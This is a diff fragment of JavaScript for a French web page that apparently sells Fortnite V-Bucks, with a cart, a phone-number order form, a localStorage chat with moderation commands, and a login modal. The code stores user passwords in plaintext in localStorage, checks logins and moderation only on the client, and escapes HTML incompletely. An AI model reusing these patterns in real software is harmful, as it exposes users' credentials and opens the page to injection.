+            else if (cmd === '/profil' && parts[1]) { showProfileEmbed(parts[1].replace('@', '')); return; }
+            else { addSystemMessage(`Commande inconnue. Tapez /help.`); return; }
+        }
+        // Vérifier timeout avant d'envoyer
+        if (isUserTimedOut(currentUserChat)) { addSystemMessage("Vous êtes actuellement en timeout, vous ne pouvez pas envoyer de message."); return; }
+        const newMsg = { sender: currentUserChat, text: text || "", image: imageBase64, audio: audioBase64, timestamp: Date.now(), isSystem: false };
+        chatMessages.push(newMsg);
+        saveMessagesToDB();
+        renderChatMessages();
+    }
+
+    function renderChatMessages() {
+        const container = document.getElementById("chatMessagesContainer");
+        if (!container) return;
+        if (chatMessages.length === 0) { container.innerHTML = '<div style="text-align:center; color:#aaa; padding:20px;">Aucun message.</div>'; return; }
+        let html = '';
+        for (let msg of chatMessages) {
+            if (msg.isSystem) {
+                if (msg.isEmbed && msg.embedHtml) html += msg.embedHtml;
+                else html += `<div class="message system">${escapeHtml(msg.text)}</div>`;
+                continue;
+            }
+            const isOwn = (msg.sender === currentUserChat);
+            html += `<div class="message ${isOwn ? 'user' : 'other'}"><div class="message-info">${escapeHtml(msg.sender)}</div>`;
+            if (msg.text) html += `<div>${escapeHtml(msg.text)}</div>`;
+            if (msg.image) html += `<img src="${msg.image}" class="message-img" alt="photo">`;
+            if (msg.audio) html += `<div class="audio-message"><audio controls src="${msg.audio}" style="height:36px;"></audio></div>`;
+            html += `</div>`;
+        }
+        container.innerHTML = html;
+        container.scrollTop = container.scrollHeight;
+    }
+    function escapeHtml(str) { if (!str) return ''; return str.replace(/[&<>]/g, m => ({ '&':'&amp;', '<':'&lt;', '>':'&gt;' }[m])); }
+    window.addEventListener('storage', (event) => { if (event.key === 'vb_chat_messages') { chatMessages = JSON.parse(localStorage.getItem("vb_chat_messages") || "[]"); renderChatMessages(); } });
+
+    // SLASH MENU
+    const chatInput = document.getElementById('chatMessageInput');
+    const slashMenu = document.getElementById('slashMenu');
+    chatInput.addEventListener('input', (e) => {
+        if (e.target.value === '/') slashMenu.style.display = 'block';
+        else if (e.target.value.startsWith('/')) slashMenu.style.display = 'block';
+        else slashMenu.style.display = 'none';
+    });
+    document.querySelectorAll('.slash-menu-item').forEach(item => {
+        item.addEventListener('click', () => {
+            const command = item.getAttribute('data-command');
+            if (command === '/clear') chatInput.value = '/clear ';
+            else if (command === '/ban') chatInput.value = '/ban @';
+            else if (command === '/timeout') chatInput.value = '/timeout @ ';
+            else if (command === '/profil') chatInput.value = '/profil @';
+            else chatInput.value = command + ' ';
+            chatInput.focus();
+            slashMenu.style.display = 'none';
+        });
+    });
+    document.addEventListener('click', (e) => { if (!chatInput.contains(e.target) && !slashMenu.contains(e.target)) slashMenu.style.display = 'none'; });
+
+    // Audio recording
+    let mediaRecorder, audioChunks = [], isRecording = false;
+    const recordBtn = document.getElementById('recordAudioBtn');
+    async function startRecording() {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+            mediaRecorder = new MediaRecorder(stream);
+            audioChunks = [];
+            mediaRecorder.ondataavailable = e => audioChunks.push(e.data);
+            mediaRecorder.onstop = () => {
+                const blob = new Blob(audioChunks, { type: 'audio/webm' });
+                const reader = new FileReader();
+                reader.readAsDataURL(blob);
+                reader.onloadend = () => addAudioMessage(reader.result);
+                stream.getTracks().forEach(t => t.stop());
+            };
+            mediaRecorder.start();
+            isRecording = true;
+            recordBtn.classList.add('recording-btn');
+            showToast("Enregistrement... cliquez à nouveau pour arrêter");
+        } catch (err) { showToast("Micro non autorisé", true); }
+    }
+    function stopRecording() { if (mediaRecorder && isRecording) { mediaRecorder.stop(); isRecording = false; recordBtn.classList.remove('recording-btn'); } }
+    recordBtn.addEventListener('click', () => { if (isRecording) stopRecording(); else startRecording(); });
+
+    // Panier, commandes, etc. (reste identique)
+    let cart = [];
+    const vbMap = { '1000':'1 000 V-Bucks', '2800':'2 800 V-Bucks', '5000':'5 000 V-Bucks', '13500':'13 500 V-Bucks' };
+    function saveCart() { localStorage.setItem('vb_cart', JSON.stringify(cart)); updateCartUI(); updateCartCounter(); }
+    function loadCart() { cart = JSON.parse(localStorage.getItem('vb_cart') || "[]"); updateCartUI(); updateCartCounter(); }
+    function addToCart(vbValue) { const name = vbMap[vbValue]; const existing = cart.find(i => i.id === vbValue); if (existing) existing.quantity++; else cart.push({ id: vbValue, name, quantity: 1 }); saveCart(); showToast(`✔ ${name} ajouté`); }
+    function updateQuantity(idx, delta) { if (cart[idx]) { let newQty = cart[idx].quantity + delta; if (newQty <= 0) cart.splice(idx,1); else cart[idx].quantity = newQty; saveCart(); } }
+    function updateCartUI() {
+        const container = document.getElementById('cartItemsContainer');
+        if (!container) return;
+        if (cart.length === 0) { container.innerHTML = '<div class="empty-cart">Panier vide</div>'; document.getElementById('cartTotalPrice').innerText = 'Total : 0 article(s)'; return; }
+        let totalItems = 0, html = '';
+        cart.forEach((item, idx) => { totalItems += item.quantity; html += `<div class="cart-item-row"><div><div>${item.name}</div><div>Qté: ${item.quantity}</div></div><div class="cart-qty-control"><button data-idx="${idx}" data-delta="-1">-</button><span>${item.quantity}</span><button data-idx="${idx}" data-delta="1">+</button><button class="remove-cart-item" data-idx="${idx}">🗑</button></div></div>`; });
+        container.innerHTML = html;
+        document.getElementById('cartTotalPrice').innerText = `Total : ${totalItems} article(s)`;
+        document.querySelectorAll('.cart-qty-control button[data-delta]').forEach(btn => btn.addEventListener('click', (e) => { const idx = parseInt(btn.dataset.idx), delta = parseInt(btn.dataset.delta); updateQuantity(idx, delta); }));
+        document.querySelectorAll('.remove-cart-item').forEach(btn => btn.addEventListener('click', (e) => { removeItem(parseInt(btn.dataset.idx)); }));
+    }
+    function removeItem(idx) { cart.splice(idx,1); saveCart(); }
+    function updateCartCounter() { document.getElementById('cartCounter').innerText = cart.reduce((s,i)=>s+i.quantity,0); }
+
+    const phoneInput = document.getElementById('phoneNumber');
+    function formatPhone(v) { let d = v.replace(/\D/g,''); if(d.length>10) d=d.slice(0,10); let f=''; for(let i=0;i<d.length;i++){ if(i===2||i===4||i===6||i===8) f+=' '; f+=d[i]; } return f; }
+    phoneInput.addEventListener('input', e => e.target.value = formatPhone(e.target.value));
+    function isValidFrenchPhone(p) { const d = p.replace(/\s/g,''); return /^(06|07)[0-9]{8}$/.test(d); }
+    function showToast(msg, isErr=false) { const t=document.createElement('div'); t.className='toast'; t.style.background=isErr?'#aa2e2e':'#1f2a2f'; t.innerText=msg; document.body.appendChild(t); setTimeout(()=>t.remove(),2500); }
+    document.getElementById('finalOrderBtn').addEventListener('click', () => {
+        const pseudo = document.getElementById('gamertag').value.trim();
+        const platform = document.getElementById('platformSelect').value;
+        const phone = phoneInput.value.trim();
+        if (!pseudo) return showToast('Pseudo requis', true);
+        if (!isValidFrenchPhone(phone)) { document.getElementById('phoneError').innerText = 'Numéro invalide'; return; }
+        if (cart.length===0) return showToast('Panier vide', true);
+        showToast(`Commande validée pour ${pseudo} (${platform})`);
+        cart = []; saveCart(); document.getElementById('cartPanel').classList.remove('open');
+    });
+    document.getElementById('openCartBtn').addEventListener('click', () => document.getElementById('cartPanel').classList.add('open'));
+    document.getElementById('closeCartPanel').addEventListener('click', () => document.getElementById('cartPanel').classList.remove('open'));
+    document.getElementById('addToCartBtn').addEventListener('click', () => addToCart(document.getElementById('vbucksDropdown').value));
+    document.getElementById('infoModalBtn').addEventListener('click', () => { const m=document.createElement('div'); m.className='fullscreen-modal'; m.innerHTML=`<div class="modal-content"><h2>Infos</h2><p>Chat avec commandes /help, /clearall, /clear N, /ban, /timeout, /profil</p><button id="closeFullModal">Fermer</button></div>`; document.body.appendChild(m); document.getElementById('closeFullModal').addEventListener('click',()=>m.remove()); m.addEventListener('click',e=>{if(e.target===m) m.remove();}); });
+    // Chat UI
+    const chatWidget = document.getElementById('chatWidget');
+    function openChat() { currentUserChat = document.getElementById('gamertag').value.trim() || "Invité"; chatWidget.classList.add('open'); renderChatMessages(); }
+    function closeChat() { chatWidget.classList.remove('open'); if(isRecording) stopRecording(); }
+    document.getElementById('openChatNavBtn').addEventListener('click', openChat);
+    document.getElementById('closeChatBtn').addEventListener('click', closeChat);
+    document.getElementById('sendChatMsgBtn').addEventListener('click', () => { const txt = document.getElementById('chatMessageInput').value.trim(); if(txt) { addMessageToDB(txt); document.getElementById('chatMessageInput').value = ''; slashMenu.style.display = 'none'; } });
+    document.getElementById('chatMessageInput').addEventListener('keypress', e => { if(e.key === 'Enter') document.getElementById('sendChatMsgBtn').click(); });
+    const photoInput = document.getElementById('photoFileInput');
+    document.getElementById('sendPhotoBtn').addEventListener('click', () => photoInput.click());
+    photoInput.addEventListener('change', e => { const file = e.target.files[0]; if(file && file.type.startsWith('image/')) { const reader = new FileReader(); reader.onload = ev => { addMessageToDB("", ev.target.result); photoInput.value = ''; }; reader.readAsDataURL(file); } else if(file) showToast("Image uniquement", true); });
+    // Drag
+    const dragHandle = document.getElementById('chatDragHandle');
+    let drag = false, sX, sY, sL, sB;
+    function onMove(ev) { if(!drag) return; let dx = ev.clientX - sX, dy = ev.clientY - sY; let nl = sL + dx, nb = sB - dy; nl = Math.min(window.innerWidth - chatWidget.offsetWidth - 10, Math.max(10, nl)); nb = Math.min(window.innerHeight - chatWidget.offsetHeight - 10, Math.max(60, nb)); chatWidget.style.left = nl + 'px'; chatWidget.style.bottom = nb + 'px'; chatWidget.style.right = 'auto'; }
+    function onUp() { drag = false; document.removeEventListener('mousemove', onMove); document.removeEventListener('mouseup', onUp); }
+    dragHandle.addEventListener('mousedown', (e) => { if(e.target.tagName === 'BUTTON') return; drag = true; sX = e.clientX; sY = e.clientY; const rect = chatWidget.getBoundingClientRect(); sL = rect.left; sB = window.innerHeight - rect.bottom; chatWidget.style.left = sL + 'px'; chatWidget.style.bottom = sB + 'px'; chatWidget.style.right = 'auto'; document.addEventListener('mousemove', onMove); document.addEventListener('mouseup', onUp); e.preventDefault(); });
+    // Navigation
+    document.querySelectorAll('.nav-item').forEach(btn => btn.addEventListener('click', () => { const t = btn.dataset.nav; if(t==='account') openAccountModal(); else if(t==='help') { const m=document.createElement('div'); m.className='fullscreen-modal'; m.innerHTML=`<div class="modal-content"><h2>Aide</h2><p>Commandes slash : /help, /clearall, /clear N, /ban @user, /timeout @user minutes, /profil @user</p><button id="closeHelpModal">Fermer</button></div>`; document.body.appendChild(m); document.getElementById('closeHelpModal').addEventListener('click',()=>m.remove()); m.addEventListener('click',e=>{if(e.target===m) m.remove();}); } else if(t==='home') document.querySelector('.form-card')?.scrollIntoView({behavior:'smooth'}); }));
+    function openAccountModal() { /* même code que précédent */ const modal = document.createElement('div'); modal.className='fullscreen-modal'; let isLogin=true; function render(){ modal.innerHTML=`<div class="modal-content"><h2>${isLogin?'Connexion':'Inscription'}</h2><input type="email" id="authEmail" placeholder="Email"><input type="password" id="authPassword" placeholder="Mot de passe">${!isLogin?'<input type="text" id="authUsername" placeholder="Pseudo Fortnite">':''}<button id="authSubmitBtn">${isLogin?'Se connecter':'Créer'}</button><div class="toggle-auth">${isLogin?'Pas de compte ? Créer':'Déjà un compte ? Connexion'}</div>${currentUserAccount?'<button id="logoutBtn" style="background:#333;">Déconnexion</button>':''}</div>`; modal.querySelector('#authSubmitBtn').addEventListener('click',()=>{ const email=modal.querySelector('#authEmail').value.trim(), pwd=modal.querySelector('#authPassword').value.trim(); if(isLogin){ const users=loadUsers(); const user=users.find(u=>u.email===email && u.password===pwd); if(user){ setCurrentUser({email:user.email, username:user.username, avatar:user.avatar, banner:user.banner}); showToast(`Connecté ${user.username}`); modal.remove(); } else showToast("Identifiants incorrects",true); } else { const username=modal.querySelector('#authUsername').value.trim(); if(!email||!pwd||!username){ showToast("Tous champs requis",true); return; } let users=loadUsers(); if(users.find(u=>u.email===email)){ showToast("Email déjà utilisé",true); return; } const newUser={email, password:pwd, username, avatar:null, banner:null, createdAt:Date.now()}; users.push(newUser); saveUsers(users); setCurrentUser(newUser); showToast(`Compte créé : ${username}`); modal.remove(); } }); const toggle=modal.querySelector('.toggle-auth'); if(toggle) toggle.addEventListener('click',()=>{ isLogin=!isLogin; render(); }); if(currentUserAccount){ const logoutBtn=modal.querySelector('#logoutBtn'); if(logoutBtn) logoutBtn.addEventListener('click',()=>{ setCurrentUser(null); showToast("Déconnecté"); modal.remove(); }); } } render(); document.body.appendChild(modal); modal.addEventListener('click',e=>{if(e.target===modal) modal.remove();}); }
+    loadCart(); loadMessagesFromDB(); const savedUser = getCurrentUser(); if(savedUser) { currentUserAccount = savedUser; currentUserChat = savedUser.username; document.getElementById('gamertag').value = savedUser.username; } else currentUserChat = "Invité"; renderChatMessages();
 </script>
 </body>
 </html>
